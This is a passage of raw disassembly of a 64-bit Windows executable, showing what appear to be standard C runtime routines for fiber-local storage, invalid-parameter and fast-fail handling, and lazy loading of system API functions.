   140007321:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140007325:	e8 72 07 00 00       	call   0x140007a9c
   14000732a:	85 c0                	test   %eax,%eax
   14000732c:	74 e7                	je     0x140007315
   14000732e:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140007333:	b9 01 00 00 00       	mov    $0x1,%ecx
   140007338:	e8 6b 0b 00 00       	call   0x140007ea8
   14000733d:	8b 0d 0d 2d 01 00    	mov    0x12d0d(%rip),%ecx        # 0x14001a050
   140007343:	48 8b f8             	mov    %rax,%rdi
   140007346:	48 85 c0             	test   %rax,%rax
   140007349:	75 10                	jne    0x14000735b
   14000734b:	33 d2                	xor    %edx,%edx
   14000734d:	e8 4a 07 00 00       	call   0x140007a9c
   140007352:	33 c9                	xor    %ecx,%ecx
   140007354:	e8 c7 0b 00 00       	call   0x140007f20
   140007359:	eb ba                	jmp    0x140007315
   14000735b:	48 8b d7             	mov    %rdi,%rdx
   14000735e:	e8 39 07 00 00       	call   0x140007a9c
   140007363:	85 c0                	test   %eax,%eax
   140007365:	75 12                	jne    0x140007379
   140007367:	8b 0d e3 2c 01 00    	mov    0x12ce3(%rip),%ecx        # 0x14001a050
   14000736d:	33 d2                	xor    %edx,%edx
   14000736f:	e8 28 07 00 00       	call   0x140007a9c
   140007374:	48 8b cf             	mov    %rdi,%rcx
   140007377:	eb db                	jmp    0x140007354
   140007379:	48 8b cf             	mov    %rdi,%rcx
   14000737c:	e8 93 fb ff ff       	call   0x140006f14
   140007381:	33 c9                	xor    %ecx,%ecx
   140007383:	e8 98 0b 00 00       	call   0x140007f20
   140007388:	48 8b f7             	mov    %rdi,%rsi
   14000738b:	8b cb                	mov    %ebx,%ecx
   14000738d:	ff 15 65 7f 00 00    	call   *0x7f65(%rip)        # 0x14000f2f8
   140007393:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007398:	48 f7 df             	neg    %rdi
   14000739b:	48 1b c0             	sbb    %rax,%rax
   14000739e:	48 23 c6             	and    %rsi,%rax
   1400073a1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400073a6:	48 83 c4 20          	add    $0x20,%rsp
   1400073aa:	5f                   	pop    %rdi
   1400073ab:	c3                   	ret
   1400073ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400073b0:	48 8d 0d 2d fc ff ff 	lea    -0x3d3(%rip),%rcx        # 0x140006fe4
   1400073b7:	e8 08 06 00 00       	call   0x1400079c4
   1400073bc:	89 05 8e 2c 01 00    	mov    %eax,0x12c8e(%rip)        # 0x14001a050
   1400073c2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400073c5:	75 04                	jne    0x1400073cb
   1400073c7:	32 c0                	xor    %al,%al
   1400073c9:	eb 15                	jmp    0x1400073e0
   1400073cb:	e8 10 ff ff ff       	call   0x1400072e0
   1400073d0:	48 85 c0             	test   %rax,%rax
   1400073d3:	75 09                	jne    0x1400073de
   1400073d5:	33 c9                	xor    %ecx,%ecx
   1400073d7:	e8 0c 00 00 00       	call   0x1400073e8
   1400073dc:	eb e9                	jmp    0x1400073c7
   1400073de:	b0 01                	mov    $0x1,%al
   1400073e0:	48 83 c4 28          	add    $0x28,%rsp
   1400073e4:	c3                   	ret
   1400073e5:	cc                   	int3
   1400073e6:	cc                   	int3
   1400073e7:	cc                   	int3
   1400073e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400073ec:	8b 0d 5e 2c 01 00    	mov    0x12c5e(%rip),%ecx        # 0x14001a050
   1400073f2:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400073f5:	74 0c                	je     0x140007403
   1400073f7:	e8 10 06 00 00       	call   0x140007a0c
   1400073fc:	83 0d 4d 2c 01 00 ff 	orl    $0xffffffff,0x12c4d(%rip)        # 0x14001a050
   140007403:	b0 01                	mov    $0x1,%al
   140007405:	48 83 c4 28          	add    $0x28,%rsp
   140007409:	c3                   	ret
   14000740a:	cc                   	int3
   14000740b:	cc                   	int3
   14000740c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007411:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007416:	55                   	push   %rbp
   140007417:	57                   	push   %rdi
   140007418:	41 56                	push   %r14
   14000741a:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140007421:	ff 
   140007422:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140007429:	48 8b 05 d0 2b 01 00 	mov    0x12bd0(%rip),%rax        # 0x14001a000
   140007430:	48 33 c4             	xor    %rsp,%rax
   140007433:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   14000743a:	41 8b f8             	mov    %r8d,%edi
   14000743d:	8b f2                	mov    %edx,%esi
   14000743f:	8b d9                	mov    %ecx,%ebx
   140007441:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007444:	74 05                	je     0x14000744b
   140007446:	e8 69 c7 ff ff       	call   0x140003bb4
   14000744b:	33 d2                	xor    %edx,%edx
   14000744d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007452:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140007458:	e8 73 d2 ff ff       	call   0x1400046d0
   14000745d:	33 d2                	xor    %edx,%edx
   14000745f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140007463:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140007469:	e8 62 d2 ff ff       	call   0x1400046d0
   14000746e:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140007473:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140007478:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000747c:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140007480:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140007485:	ff 15 f5 7d 00 00    	call   *0x7df5(%rip)        # 0x14000f280
   14000748b:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140007492:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140007497:	49 8b ce             	mov    %r14,%rcx
   14000749a:	45 33 c0             	xor    %r8d,%r8d
   14000749d:	ff 15 e5 7d 00 00    	call   *0x7de5(%rip)        # 0x14000f288
   1400074a3:	48 85 c0             	test   %rax,%rax
   1400074a6:	74 36                	je     0x1400074de
   1400074a8:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400074ae:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400074b3:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400074b8:	4c 8b c8             	mov    %rax,%r9
   1400074bb:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400074c0:	4d 8b c6             	mov    %r14,%r8
   1400074c3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400074c8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400074cd:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400074d1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400074d6:	33 c9                	xor    %ecx,%ecx
   1400074d8:	ff 15 b2 7d 00 00    	call   *0x7db2(%rip)        # 0x14000f290
   1400074de:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   1400074e5:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   1400074ec:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   1400074f3:	48 83 c0 08          	add    $0x8,%rax
   1400074f7:	89 74 24 70          	mov    %esi,0x70(%rsp)
   1400074fb:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140007502:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140007509:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000750d:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140007511:	ff 15 b9 7d 00 00    	call   *0x7db9(%rip)        # 0x14000f2d0
   140007517:	33 c9                	xor    %ecx,%ecx
   140007519:	8b f8                	mov    %eax,%edi
   14000751b:	ff 15 7f 7d 00 00    	call   *0x7d7f(%rip)        # 0x14000f2a0
   140007521:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140007526:	ff 15 6c 7d 00 00    	call   *0x7d6c(%rip)        # 0x14000f298
   14000752c:	85 c0                	test   %eax,%eax
   14000752e:	75 10                	jne    0x140007540
   140007530:	85 ff                	test   %edi,%edi
   140007532:	75 0c                	jne    0x140007540
   140007534:	83 fb ff             	cmp    $0xffffffff,%ebx
   140007537:	74 07                	je     0x140007540
   140007539:	8b cb                	mov    %ebx,%ecx
   14000753b:	e8 74 c6 ff ff       	call   0x140003bb4
   140007540:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140007547:	48 33 cc             	xor    %rsp,%rcx
   14000754a:	e8 e1 bb ff ff       	call   0x140003130
   14000754f:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140007556:	00 
   140007557:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000755b:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000755f:	49 8b e3             	mov    %r11,%rsp
   140007562:	41 5e                	pop    %r14
   140007564:	5f                   	pop    %rdi
   140007565:	5d                   	pop    %rbp
   140007566:	c3                   	ret
   140007567:	cc                   	int3
   140007568:	48 89 0d 09 3e 01 00 	mov    %rcx,0x13e09(%rip)        # 0x14001b378
   14000756f:	c3                   	ret
   140007570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007575:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000757a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000757f:	57                   	push   %rdi
   140007580:	48 83 ec 30          	sub    $0x30,%rsp
   140007584:	41 8b d9             	mov    %r9d,%ebx
   140007587:	49 8b f8             	mov    %r8,%rdi
   14000758a:	48 8b f2             	mov    %rdx,%rsi
   14000758d:	48 8b e9             	mov    %rcx,%rbp
   140007590:	e8 4b fd ff ff       	call   0x1400072e0
   140007595:	48 85 c0             	test   %rax,%rax
   140007598:	74 3d                	je     0x1400075d7
   14000759a:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   1400075a1:	48 85 c0             	test   %rax,%rax
   1400075a4:	74 31                	je     0x1400075d7
   1400075a6:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400075ab:	44 8b cb             	mov    %ebx,%r9d
   1400075ae:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400075b3:	4c 8b c7             	mov    %rdi,%r8
   1400075b6:	48 8b d6             	mov    %rsi,%rdx
   1400075b9:	48 8b cd             	mov    %rbp,%rcx
   1400075bc:	ff 15 96 7e 00 00    	call   *0x7e96(%rip)        # 0x14000f458
   1400075c2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400075c7:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400075cc:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400075d1:	48 83 c4 30          	add    $0x30,%rsp
   1400075d5:	5f                   	pop    %rdi
   1400075d6:	c3                   	ret
   1400075d7:	4c 8b 15 22 2a 01 00 	mov    0x12a22(%rip),%r10        # 0x14001a000
   1400075de:	44 8b cb             	mov    %ebx,%r9d
   1400075e1:	41 8b ca             	mov    %r10d,%ecx
   1400075e4:	4c 8b c7             	mov    %rdi,%r8
   1400075e7:	4c 33 15 8a 3d 01 00 	xor    0x13d8a(%rip),%r10        # 0x14001b378
   1400075ee:	83 e1 3f             	and    $0x3f,%ecx
   1400075f1:	49 d3 ca             	ror    %cl,%r10
   1400075f4:	48 8b d6             	mov    %rsi,%rdx
   1400075f7:	4d 85 d2             	test   %r10,%r10
   1400075fa:	74 0f                	je     0x14000760b
   1400075fc:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140007601:	49 8b c2             	mov    %r10,%rax
   140007604:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007609:	eb ae                	jmp    0x1400075b9
   14000760b:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140007610:	48 8b cd             	mov    %rbp,%rcx
   140007613:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007618:	e8 23 00 00 00       	call   0x140007640
   14000761d:	cc                   	int3
   14000761e:	cc                   	int3
   14000761f:	cc                   	int3
   140007620:	48 83 ec 38          	sub    $0x38,%rsp
   140007624:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000762a:	45 33 c9             	xor    %r9d,%r9d
   14000762d:	45 33 c0             	xor    %r8d,%r8d
   140007630:	33 d2                	xor    %edx,%edx
   140007632:	33 c9                	xor    %ecx,%ecx
   140007634:	e8 37 ff ff ff       	call   0x140007570
   140007639:	48 83 c4 38          	add    $0x38,%rsp
   14000763d:	c3                   	ret
   14000763e:	cc                   	int3
   14000763f:	cc                   	int3
   140007640:	48 83 ec 28          	sub    $0x28,%rsp
   140007644:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007649:	ff 15 59 7c 00 00    	call   *0x7c59(%rip)        # 0x14000f2a8
   14000764f:	85 c0                	test   %eax,%eax
   140007651:	74 07                	je     0x14000765a
   140007653:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007658:	cd 29                	int    $0x29
   14000765a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140007660:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140007665:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140007669:	e8 9e fd ff ff       	call   0x14000740c
   14000766e:	ff 15 5c 7b 00 00    	call   *0x7b5c(%rip)        # 0x14000f1d0
   140007674:	48 8b c8             	mov    %rax,%rcx
   140007677:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   14000767c:	48 83 c4 28          	add    $0x28,%rsp
   140007680:	48 ff 25 39 7b 00 00 	rex.W jmp *0x7b39(%rip)        # 0x14000f1c0
   140007687:	cc                   	int3
   140007688:	33 c0                	xor    %eax,%eax
   14000768a:	4c 8d 0d 6f 90 00 00 	lea    0x906f(%rip),%r9        # 0x140010700
   140007691:	49 8b d1             	mov    %r9,%rdx
   140007694:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140007698:	3b 0a                	cmp    (%rdx),%ecx
   14000769a:	74 2b                	je     0x1400076c7
   14000769c:	ff c0                	inc    %eax
   14000769e:	49 03 d0             	add    %r8,%rdx
   1400076a1:	83 f8 2d             	cmp    $0x2d,%eax
   1400076a4:	72 f2                	jb     0x140007698
   1400076a6:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400076a9:	83 f8 11             	cmp    $0x11,%eax
   1400076ac:	77 06                	ja     0x1400076b4
   1400076ae:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400076b3:	c3                   	ret
   1400076b4:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   1400076ba:	b8 16 00 00 00       	mov    $0x16,%eax
   1400076bf:	83 f9 0e             	cmp    $0xe,%ecx
   1400076c2:	41 0f 46 c0          	cmovbe %r8d,%eax
   1400076c6:	c3                   	ret
   1400076c7:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   1400076cc:	c3                   	ret
   1400076cd:	cc                   	int3
   1400076ce:	cc                   	int3
   1400076cf:	cc                   	int3
   1400076d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400076d5:	57                   	push   %rdi
   1400076d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400076da:	8b f9                	mov    %ecx,%edi
   1400076dc:	e8 ff fb ff ff       	call   0x1400072e0
   1400076e1:	48 85 c0             	test   %rax,%rax
   1400076e4:	75 09                	jne    0x1400076ef
   1400076e6:	48 8d 05 6b 29 01 00 	lea    0x1296b(%rip),%rax        # 0x14001a058
   1400076ed:	eb 04                	jmp    0x1400076f3
   1400076ef:	48 83 c0 24          	add    $0x24,%rax
   1400076f3:	89 38                	mov    %edi,(%rax)
   1400076f5:	e8 e6 fb ff ff       	call   0x1400072e0
   1400076fa:	48 8d 1d 53 29 01 00 	lea    0x12953(%rip),%rbx        # 0x14001a054
   140007701:	48 85 c0             	test   %rax,%rax
   140007704:	74 04                	je     0x14000770a
   140007706:	48 8d 58 20          	lea    0x20(%rax),%rbx
   14000770a:	8b cf                	mov    %edi,%ecx
   14000770c:	e8 77 ff ff ff       	call   0x140007688
   140007711:	89 03                	mov    %eax,(%rbx)
   140007713:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007718:	48 83 c4 20          	add    $0x20,%rsp
   14000771c:	5f                   	pop    %rdi
   14000771d:	c3                   	ret
   14000771e:	cc                   	int3
   14000771f:	cc                   	int3
   140007720:	48 83 ec 28          	sub    $0x28,%rsp
   140007724:	e8 b7 fb ff ff       	call   0x1400072e0
   140007729:	48 85 c0             	test   %rax,%rax
   14000772c:	75 09                	jne    0x140007737
   14000772e:	48 8d 05 23 29 01 00 	lea    0x12923(%rip),%rax        # 0x14001a058
   140007735:	eb 04                	jmp    0x14000773b
   140007737:	48 83 c0 24          	add    $0x24,%rax
   14000773b:	48 83 c4 28          	add    $0x28,%rsp
   14000773f:	c3                   	ret
   140007740:	48 83 ec 28          	sub    $0x28,%rsp
   140007744:	e8 97 fb ff ff       	call   0x1400072e0
   140007749:	48 85 c0             	test   %rax,%rax
   14000774c:	75 09                	jne    0x140007757
   14000774e:	48 8d 05 ff 28 01 00 	lea    0x128ff(%rip),%rax        # 0x14001a054
   140007755:	eb 04                	jmp    0x14000775b
   140007757:	48 83 c0 20          	add    $0x20,%rax
   14000775b:	48 83 c4 28          	add    $0x28,%rsp
   14000775f:	c3                   	ret
   140007760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007765:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000776a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000776f:	57                   	push   %rdi
   140007770:	41 54                	push   %r12
   140007772:	41 55                	push   %r13
   140007774:	41 56                	push   %r14
   140007776:	41 57                	push   %r15
   140007778:	48 83 ec 20          	sub    $0x20,%rsp
   14000777c:	44 8b f9             	mov    %ecx,%r15d
   14000777f:	4c 8d 35 7a 88 ff ff 	lea    -0x7786(%rip),%r14        # 0x140000000
   140007786:	4d 8b e1             	mov    %r9,%r12
   140007789:	49 8b e8             	mov    %r8,%rbp
   14000778c:	4c 8b ea             	mov    %rdx,%r13
   14000778f:	4b 8b 8c fe 20 b4 01 	mov    0x1b420(%r14,%r15,8),%rcx
   140007796:	00 
   140007797:	4c 8b 15 62 28 01 00 	mov    0x12862(%rip),%r10        # 0x14001a000
   14000779e:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400077a2:	41 8b c2             	mov    %r10d,%eax
   1400077a5:	49 8b d2             	mov    %r10,%rdx
   1400077a8:	48 33 d1             	xor    %rcx,%rdx
   1400077ab:	83 e0 3f             	and    $0x3f,%eax
   1400077ae:	8a c8                	mov    %al,%cl
   1400077b0:	48 d3 ca             	ror    %cl,%rdx
   1400077b3:	48 3b d7             	cmp    %rdi,%rdx
   1400077b6:	0f 84 5b 01 00 00    	je     0x140007917
   1400077bc:	48 85 d2             	test   %rdx,%rdx
   1400077bf:	74 08                	je     0x1400077c9
   1400077c1:	48 8b c2             	mov    %rdx,%rax
   1400077c4:	e9 50 01 00 00       	jmp    0x140007919
   1400077c9:	4d 3b c4             	cmp    %r12,%r8
   1400077cc:	0f 84 d9 00 00 00    	je     0x1400078ab
   1400077d2:	8b 75 00             	mov    0x0(%rbp),%esi
   1400077d5:	49 8b 9c f6 80 b3 01 	mov    0x1b380(%r14,%rsi,8),%rbx
   1400077dc:	00 
   1400077dd:	48 85 db             	test   %rbx,%rbx
   1400077e0:	74 0e                	je     0x1400077f0
   1400077e2:	48 3b df             	cmp    %rdi,%rbx
   1400077e5:	0f 84 ac 00 00 00    	je     0x140007897
   1400077eb:	e9 a2 00 00 00       	jmp    0x140007892
   1400077f0:	4d 8b b4 f6 70 08 01 	mov    0x10870(%r14,%rsi,8),%r14
   1400077f7:	00 
   1400077f8:	33 d2                	xor    %edx,%edx
   1400077fa:	49 8b ce             	mov    %r14,%rcx
   1400077fd:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140007803:	ff 15 37 7b 00 00    	call   *0x7b37(%rip)        # 0x14000f340
   140007809:	48 8b d8             	mov    %rax,%rbx
   14000780c:	48 85 c0             	test   %rax,%rax
   14000780f:	75 4f                	jne    0x140007860
   140007811:	ff 15 b9 78 00 00    	call   *0x78b9(%rip)        # 0x14000f0d0
   140007817:	83 f8 57             	cmp    $0x57,%eax
   14000781a:	75 42                	jne    0x14000785e
   14000781c:	8d 58 b0             	lea    -0x50(%rax),%ebx
   14000781f:	49 8b ce             	mov    %r14,%rcx
   140007822:	44 8b c3             	mov    %ebx,%r8d
   140007825:	48 8d 15 3c 8c 00 00 	lea    0x8c3c(%rip),%rdx        # 0x140010468
   14000782c:	e8 8f f5 ff ff       	call   0x140006dc0
   140007831:	85 c0                	test   %eax,%eax
   140007833:	74 29                	je     0x14000785e
   140007835:	44 8b c3             	mov    %ebx,%r8d
   140007838:	48 8d 15 29 95 00 00 	lea    0x9529(%rip),%rdx        # 0x140010d68
   14000783f:	49 8b ce             	mov    %r14,%rcx
   140007842:	e8 79 f5 ff ff       	call   0x140006dc0
   140007847:	85 c0                	test   %eax,%eax
   140007849:	74 13                	je     0x14000785e
   14000784b:	45 33 c0             	xor    %r8d,%r8d
   14000784e:	33 d2                	xor    %edx,%edx
   140007850:	49 8b ce             	mov    %r14,%rcx
   140007853:	ff 15 e7 7a 00 00    	call   *0x7ae7(%rip)        # 0x14000f340
   140007859:	48 8b d8             	mov    %rax,%rbx
   14000785c:	eb 02                	jmp    0x140007860
   14000785e:	33 db                	xor    %ebx,%ebx
   140007860:	4c 8d 35 99 87 ff ff 	lea    -0x7867(%rip),%r14        # 0x140000000
   140007867:	48 85 db             	test   %rbx,%rbx
   14000786a:	75 0d                	jne    0x140007879
   14000786c:	48 8b c7             	mov    %rdi,%rax
   14000786f:	49 87 84 f6 80 b3 01 	xchg   %rax,0x1b380(%r14,%rsi,8)
   140007876:	00 
   140007877:	eb 1e                	jmp    0x140007897
   140007879:	48 8b c3             	mov    %rbx,%rax
   14000787c:	49 87 84 f6 80 b3 01 	xchg   %rax,0x1b380(%r14,%rsi,8)
   140007883:	00 
   140007884:	48 85 c0             	test   %rax,%rax
   140007887:	74 09                	je     0x140007892
   140007889:	48 8b cb             	mov    %rbx,%rcx
   14000788c:	ff 15 ae 78 00 00    	call   *0x78ae(%rip)        # 0x14000f140
   140007892:	48 85 db             	test   %rbx,%rbx
   140007895:	75 55                	jne    0x1400078ec
   140007897:	48 83 c5 04          	add    $0x4,%rbp
   14000789b:	49 3b ec             	cmp    %r12,%rbp
   14000789e:	0f 85 2e ff ff ff    	jne    0x1400077d2
   1400078a4:	4c 8b 15 55 27 01 00 	mov    0x12755(%rip),%r10        # 0x14001a000
   1400078ab:	33 db                	xor    %ebx,%ebx
   1400078ad:	48 85 db             	test   %rbx,%rbx
   1400078b0:	74 4a                	je     0x1400078fc
   1400078b2:	49 8b d5             	mov    %r13,%rdx
   1400078b5:	48 8b cb             	mov    %rbx,%rcx
   1400078b8:	ff 15 4a 78 00 00    	call   *0x784a(%rip)        # 0x14000f108
   1400078be:	48 85 c0             	test   %rax,%rax
   1400078c1:	74 32                	je     0x1400078f5
   1400078c3:	4c 8b 05 36 27 01 00 	mov    0x12736(%rip),%r8        # 0x14001a000
   1400078ca:	ba 40 00 00 00       	mov    $0x40,%edx
   1400078cf:	41 8b c8             	mov    %r8d,%ecx
   1400078d2:	83 e1 3f             	and    $0x3f,%ecx
   1400078d5:	2b d1                	sub    %ecx,%edx
   1400078d7:	8a ca                	mov    %dl,%cl
   1400078d9:	48 8b d0             	mov    %rax,%rdx
   1400078dc:	48 d3 ca             	ror    %cl,%rdx
   1400078df:	49 33 d0             	xor    %r8,%rdx
   1400078e2:	4b 87 94 fe 20 b4 01 	xchg   %rdx,0x1b420(%r14,%r15,8)
   1400078e9:	00 
   1400078ea:	eb 2d                	jmp    0x140007919
   1400078ec:	4c 8b 15 0d 27 01 00 	mov    0x1270d(%rip),%r10        # 0x14001a000
   1400078f3:	eb b8                	jmp    0x1400078ad
   1400078f5:	4c 8b 15 04 27 01 00 	mov    0x12704(%rip),%r10        # 0x14001a000
   1400078fc:	41 8b c2             	mov    %r10d,%eax
   1400078ff:	b9 40 00 00 00       	mov    $0x40,%ecx
   140007904:	83 e0 3f             	and    $0x3f,%eax
   140007907:	2b c8                	sub    %eax,%ecx
   140007909:	48 d3 cf             	ror    %cl,%rdi
   14000790c:	49 33 fa             	xor    %r10,%rdi
   14000790f:	4b 87 bc fe 20 b4 01 	xchg   %rdi,0x1b420(%r14,%r15,8)
   140007916:	00 
   140007917:	33 c0                	xor    %eax,%eax
   140007919:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000791e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007923:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007928:	48 83 c4 20          	add    $0x20,%rsp
   14000792c:	41 5f                	pop    %r15
   14000792e:	41 5e                	pop    %r14
   140007930:	41 5d                	pop    %r13
   140007932:	41 5c                	pop    %r12
   140007934:	5f                   	pop    %rdi
   140007935:	c3                   	ret
   140007936:	cc                   	int3
   140007937:	cc                   	int3
   140007938:	40 53                	rex push %rbx
   14000793a:	48 83 ec 20          	sub    $0x20,%rsp
   14000793e:	48 8b d9             	mov    %rcx,%rbx
   140007941:	4c 8d 0d a8 94 00 00 	lea    0x94a8(%rip),%r9        # 0x140010df0
   140007948:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   14000794d:	4c 8d 05 98 94 00 00 	lea    0x9498(%rip),%r8        # 0x140010dec
   140007954:	48 8d 15 95 94 00 00 	lea    0x9495(%rip),%rdx        # 0x140010df0
   14000795b:	e8 00 fe ff ff       	call   0x140007760
   140007960:	48 85 c0             	test   %rax,%rax
   140007963:	74 16                	je     0x14000797b
   140007965:	48 8b d3             	mov    %rbx,%rdx
   140007968:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   14000796f:	48 83 c4 20          	add    $0x20,%rsp
   140007973:	5b                   	pop    %rbx
   140007974:	48 ff 25 dd 7a 00 00 	rex.W jmp *0x7add(%rip)        # 0x14000f458
   14000797b:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140007980:	48 83 c4 20          	add    $0x20,%rsp
   140007984:	5b                   	pop    %rbx
   140007985:	c3                   	ret
   140007986:	cc                   	int3
   140007987:	cc                   	int3
   140007988:	48 83 ec 28          	sub    $0x28,%rsp
   14000798c:	4c 8d 0d e9 93 00 00 	lea    0x93e9(%rip),%r9        # 0x140010d7c
   140007993:	33 c9                	xor    %ecx,%ecx
   140007995:	4c 8d 05 dc 93 00 00 	lea    0x93dc(%rip),%r8        # 0x140010d78
   14000799c:	48 8d 15 dd 93 00 00 	lea    0x93dd(%rip),%rdx        # 0x140010d80
   1400079a3:	e8 b8 fd ff ff       	call   0x140007760
   1400079a8:	48 85 c0             	test   %rax,%rax
   1400079ab:	74 0b                	je     0x1400079b8
   1400079ad:	48 83 c4 28          	add    $0x28,%rsp
   1400079b1:	48 ff 25 a0 7a 00 00 	rex.W jmp *0x7aa0(%rip)        # 0x14000f458
   1400079b8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400079bd:	48 83 c4 28          	add    $0x28,%rsp
   1400079c1:	c3                   	ret
   1400079c2:	cc                   	int3
   1400079c3:	cc                   	int3
   1400079c4:	40 53                	rex push %rbx
   1400079c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400079ca:	48 8b d9             	mov    %rcx,%rbx
   1400079cd:	4c 8d 0d c4 93 00 00 	lea    0x93c4(%rip),%r9        # 0x140010d98
   1400079d4:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400079d9:	4c 8d 05 b0 93 00 00 	lea    0x93b0(%rip),%r8        # 0x140010d90
   1400079e0:	48 8d 15 99 8a 00 00 	lea    0x8a99(%rip),%rdx        # 0x140010480
   1400079e7:	e8 74 fd ff ff       	call   0x140007760
   1400079ec:	48 85 c0             	test   %rax,%rax
   1400079ef:	74 0f                	je     0x140007a00
   1400079f1:	48 8b cb             	mov    %rbx,%rcx
   1400079f4:	48 83 c4 20          	add    $0x20,%rsp
   1400079f8:	5b                   	pop    %rbx
   1400079f9:	48 ff 25 58 7a 00 00 	rex.W jmp *0x7a58(%rip)        # 0x14000f458
   140007a00:	48 83 c4 20          	add    $0x20,%rsp
   140007a04:	5b                   	pop    %rbx
   140007a05:	48 ff 25 14 79 00 00 	rex.W jmp *0x7914(%rip)        # 0x14000f320
   140007a0c:	40 53                	rex push %rbx
   140007a0e:	48 83 ec 20          	sub    $0x20,%rsp
   140007a12:	8b d9                	mov    %ecx,%ebx
   140007a14:	4c 8d 0d 85 93 00 00 	lea    0x9385(%rip),%r9        # 0x140010da0
   140007a1b:	b9 04 00 00 00       	mov    $0x4,%ecx
   140007a20:	4c 8d 05 71 93 00 00 	lea    0x9371(%rip),%r8        # 0x140010d98
   140007a27:	48 8d 15 6a 8a 00 00 	lea    0x8a6a(%rip),%rdx        # 0x140010498
   140007a2e:	e8 2d fd ff ff       	call   0x140007760
   140007a33:	8b cb                	mov    %ebx,%ecx
   140007a35:	48 85 c0             	test   %rax,%rax
   140007a38:	74 0c                	je     0x140007a46
   140007a3a:	48 83 c4 20          	add    $0x20,%rsp
   140007a3e:	5b                   	pop    %rbx
   140007a3f:	48 ff 25 12 7a 00 00 	rex.W jmp *0x7a12(%rip)        # 0x14000f458
